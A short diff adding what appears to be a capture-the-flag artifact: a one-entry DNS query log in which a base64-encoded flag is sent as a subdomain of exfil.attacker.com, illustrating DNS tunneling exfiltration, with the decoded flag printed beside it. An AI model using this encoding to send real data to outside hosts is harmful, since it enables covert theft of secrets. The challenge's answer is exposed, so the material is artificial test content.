@@ -1,0 +1,2 @@
+DNS Query Log:
+Query: Q1RGe2Ruc183dW5uM2xfM3hmMWw3cjQ3MTBuXzIwMjZ9.exfil.attacker.com -> CTF{dns_7unn3l_3xf1l7r4710n_2026}
